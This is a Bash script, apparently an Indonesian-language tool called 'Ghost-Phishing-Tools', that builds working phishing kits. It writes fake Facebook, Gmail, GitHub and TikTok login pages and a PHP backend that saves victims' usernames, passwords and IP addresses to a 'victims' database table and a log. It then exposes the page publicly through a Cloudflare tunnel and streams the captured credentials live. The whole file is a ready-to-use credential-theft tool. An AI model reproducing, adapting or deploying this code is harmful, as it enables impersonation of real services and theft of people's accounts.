#!/bin/bash

# --- KONFIGURASI PATH ---
BASE_DIR=$(pwd)
WEB_ROOT="$BASE_DIR/web_files"
CUSTOM_DIR="$WEB_ROOT/custom_web_here" 
LOG_FILE="$BASE_DIR/database_audit.txt"
DB_NAME="ghost_audit"
DB_USER="root"
DB_PASS="" 

# --- WARNA HACKER (ULTIMATE RED) ---
RED='\033[0;31m'
B_RED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
CYAN='\033[0;36m'
GRAY='\033[1;30m'
NC='\033[0m'

# Inisialisasi Sistem
mkdir -p "$CUSTOM_DIR"
sudo touch "$LOG_FILE"
sudo chmod 777 "$LOG_FILE"

# --- FUNGSI PROGRESS BAR HACKER ---
hacker_loader() {
    local task_name=$1
    echo -ne "${B_RED}[*] $task_name: ${NC}"
    echo -ne "${RED}"
    for ((i=0; i<=50; i++)); do
        sleep 0.04
        echo -ne "█"
    done
    echo -ne "${NC} ${GREEN} [SUCCESS]${NC}\n"
}

# --- LOGIK CTRL+C (KEMBALI KE MENU UTAMA) ---
trap_ctrl_c() {
    echo -e "\n${B_RED}[!] INTERRUPT DETECTED. CLEANING PROCESS...${NC}"
    sudo kill $PHP_PID $CF_PID 2>/dev/null
    sleep 1
    main_menu
}
trap trap_ctrl_c SIGINT

show_banner() {
    clear
    echo -e "${RED}"
    echo "  ██████╗ ██████╗ ████████╗"
    echo "  ██╔════╝██╔══██╗╚══██╔══╝"
    echo "  ██║  ███╗██████╔╝   ██║   "
    echo "  ██║   ██║██╔═══╝    ██║   "
    echo "  ╚██████╔╝██║        ██║   "
    echo "   ╚═════╝ ╚═╝        ╚═╝   "
    echo -e "  ${WHITE}Ghost-Phishing-Tools${NC}"
    echo -e "  ${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${WHITE}BASE PATH: ${CYAN}$BASE_DIR${NC}"
    echo -e "  ${WHITE}DATABASE : ${GREEN}$DB_NAME${NC}\n"
}
# --- BACKEND GENERATOR (SISTEM INJEKSI DATA) ---
generate_backend() {
    local target_path=$1
    local plat_name=$2
    echo "<?php
    \$conn = new mysqli('localhost', '$DB_USER', '$DB_PASS', '$DB_NAME');
    \$u = \$_POST['u'] ?? 'Unknown';
    \$p = \$_POST['p'] ?? 'Unknown';
    \$ip = \$_SERVER['REMOTE_ADDR'];
    \$ua = \$_SERVER['HTTP_USER_AGENT'];
    
    \$stmt = \$conn->prepare(\"INSERT INTO victims (platform, ip_address, username, password) VALUES (?, ?, ?, ?)\");
    \$stmt->bind_param('ssss', \$plat_name, \$ip, \$u, \$p);
    
    if(\$stmt->execute()){
        \$log_content = @file_get_contents('$LOG_FILE');
        \$count = substr_count(\$log_content, 'Target #') + 1;
        \$data = \"\n\033[1;31mTarget #\$count\033[0m\n\033[1;37mPlatform : \$plat_name\033[0m\n\033[1;37mUser     : \$u\033[0m\n\033[1;37mPass     : \$p\033[0m\n\033[0;36mIP       : \$ip\033[0m\n------------------------\";
        file_put_contents('$LOG_FILE', \$data, FILE_APPEND);
    }
    header('Location: https://google.com');
    ?>" | sudo tee "$target_path/post.php" > /dev/null
}

# --- MENU 1: TEMPLATE AUTOMATIC (REAL CLONE) ---
generate_assets() {
    show_banner
    echo -e " ${WHITE}PILIH TEMPLATE LOGIN:${NC}"
    echo -e " [1] Facebook   [2] Gmail (Google)"
    echo -e " [3] GitHub     [4] TikTok"
    echo -e " [0] Kembali ke Menu Utama"
    read -p " >> " tpl
    [[ "$tpl" == "0" ]] && main_menu
    
    case $tpl in
        1) folder="facebook"; plat="Facebook"; html="<!DOCTYPE html><html><head><title>Facebook</title><style>body{background:#f0f2f5;font-family:Arial,sans-serif;display:flex;justify-content:center;padding-top:100px}.c{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:360px;text-align:center}.l{color:#1877f2;font-size:40px;font-weight:bold;margin-bottom:20px}input{width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:17px}.b{width:100%;background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}</style></head><body><div class='c'><div class='l'>facebook</div><form action='post.php' method='POST'><input type='text' name='u' placeholder='Email atau Telepon' required><input type='password' name='p' placeholder='Kata Sandi' required><button class='b'>Masuk</button></form></div></body></html>" ;;
        2) folder="gmail"; plat="Gmail"; html="<!DOCTYPE html><html><head><title>Sign In</title><style>body{background:#fff;font-family:Arial;display:flex;justify-content:center;padding-top:80px}.c{border:1px solid #dadce0;padding:40px;border-radius:8px;width:360px;text-align:center}input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}.b{float:right;background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-weight:bold;cursor:pointer}</style></head><body><div class='c'><img src='https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png' width='75'><h2>Login</h2><form action='post.php' method='POST'><input type='text' name='u' placeholder='Email atau ponsel' required><input type='password' name='p' placeholder='Masukkan sandi' required><br><br><button class='b'>Berikutnya</button></form></div></body></html>" ;;
        3) folder="github"; plat="GitHub"; html="<!DOCTYPE html><html><head><title>Sign in to GitHub</title><style>body{background:#f6f8fa;font-family:Arial;display:flex;justify-content:center;padding-top:60px}.c{background:#fff;border:1px solid #d8dee4;padding:20px;border-radius:6px;width:300px}input{width:100%;padding:8px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px;box-sizing:border-box}.b{width:100%;background:#2da44e;color:#fff;border:none;padding:10px;border-radius:6px;font-weight:bold;cursor:pointer}</style></head><body><div style='text-align:center'><img src='https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png' width='50'><br><h2>Sign in to GitHub</h2><div class='c'><form action='post.php' method='POST'><label>Username</label><input name='u' required><label>Password</label><input name='p' type='password' required><button class='b'>Sign in</button></form></div></div></body></html>" ;;
        4) folder="tiktok"; plat="TikTok"; html="<!DOCTYPE html><html><head><title>TikTok Login</title><style>body{background:#fff;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px}.c{width:350px;text-align:center;padding:40px;border:1px solid #ddd;border-radius:8px}input{width:100%;padding:12px;margin:8px 0;background:#f1f1f2;border:none;border-radius:4px}.b{width:100%;background:#fe2c55;color:#fff;border:none;padding:12px;font-weight:bold;margin-top:20px;cursor:pointer}</style></head><body><div class='c'><h2>Masuk ke TikTok</h2><form action='post.php' method='POST'><input name='u' placeholder='Username/Email' required><input name='p' type='password' placeholder='Password' required><button class='b'>Masuk</button></form></div></body></html>" ;;
        *) generate_assets ;;
    esac

    TARGET_PATH="$WEB_ROOT/$folder"
    mkdir -p "$TARGET_PATH"
    echo "$html" > "$TARGET_PATH/index.html"
    
    hacker_loader "CONSTRUCTING $plat REAL CLONE"
    generate_backend "$TARGET_PATH" "$plat"
    echo -e "${GREEN}[V] Module $plat Berhasil Dibuat.${NC}"; sleep 2
}

# --- MENU 2: CUSTOM WEB INTEGRATION ---
connect_custom() {
    show_banner
    echo -e " ${YELLOW}[*] MENYAMBUNGKAN FILE CUSTOM (HTML/CSS/JS)${NC}"
    if [ ! -f "$CUSTOM_DIR/index.html" ]; then
        echo -e "${RED}[!] ERROR: index.html tidak ditemukan di $CUSTOM_DIR${NC}"
        echo -e " [0] Kembali ke Menu Utama"
        read -p " >> " back; main_menu
    fi
    
    hacker_loader "INJECTING DATABASE CONNECTORS TO CUSTOM WEB"
    generate_backend "$CUSTOM_DIR" "Custom_User_Web"
    echo -e "${GREEN}[V] File Custom Anda (3 File) Berhasil Terkoneksi ke Database.${NC}"; sleep 2
}

# --- MENU 3: JALANKAN SERVER & TUNNEL ---
start_operation() {
    options=($(ls "$WEB_ROOT" 2>/dev/null))
    [[ ${#options[@]} -eq 0 ]] && { echo "Buat web dulu!"; sleep 2; main_menu; }
    
    show_banner
    echo -e " ${WHITE}PILIH WEB UNTUK DIJALANKAN:${NC}"
    for i in "${!options[@]}"; do echo -e " [${RED}$((i+1))${NC}] ${WHITE}${options[$i]}${NC}"; done
    echo -e " [0] Kembali"
    read -p " PILIH >> " choice
    [[ "$choice" == "0" ]] && main_menu
    SELECTED="${options[$((choice-1))]}"
    
    # Reset Port & Log Tunnel
    sudo fuser -k 8888/tcp > /dev/null 2>&1
    rm -f .tunnel.log
    
    # Jalankan PHP & Cloudflared
    php -S localhost:8888 -t "$WEB_ROOT/$SELECTED" > /dev/null 2>&1 &
    PHP_PID=$!
    cloudflared tunnel --url http://localhost:8888 > .tunnel.log 2>&1 &
    CF_PID=$!
    
    hacker_loader "ESTABLISHING OVERLORD SECURE TUNNEL"
    
    # RETRY LOGIC (Menunggu Link Muncul)
    URL=""
    for i in {1..30}; do
        echo -ne "${RED}⏳ Menunggu Link Overlord ($i/30)... \r${NC}"
        URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnel.log)
        [[ -n "$URL" ]] && break
        sleep 1
    done

    if [[ -z "$URL" ]]; then
        echo -e "\n${RED}[!] GAGAL MENDAPATKAN LINK. CEK KONEKSI INTERNET!${NC}"
        sudo kill $PHP_PID $CF_PID 2>/dev/null
        sleep 2; main_menu
    fi
    
    show_banner
    echo -e "${B_RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${B_RED} ${WHITE} LINK PHISING : ${YELLOW}${URL} ${B_RED} ${NC}"
    echo -e "${B_RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${B_RED}[!] MONITORING DATA... (Ctrl+C Untuk Kembali ke Menu)${NC}"
    tail -f "$LOG_FILE"
}

# --- MENU UTAMA ---
main_menu() {
    while true; do
        show_banner
        echo -e " ${RED}[1]${NC} BUAT TEMPLATE OTOMATIS (FB/GMAIL/GIT/TIKTOK)"
        echo -e " ${RED}[2]${NC} KONEKSIKAN WEB CUSTOM (3 FILE ANDA)"
        echo -e " ${RED}[3]${NC} JALANKAN EXPLOIT SERVER"
        echo -e " ${RED}[0]${NC} KELUAR DARI TOOLS"
        echo ""
        read -p " OVERLORD >> " cmd
        case $cmd in
            1) generate_assets ;;
            2) connect_custom ;;
            3) start_operation ;;
            0) sudo killall php cloudflared 2>/dev/null; exit ;;
            *) main_menu ;;
        esac
    done
}

# Mulai Tools
main_menu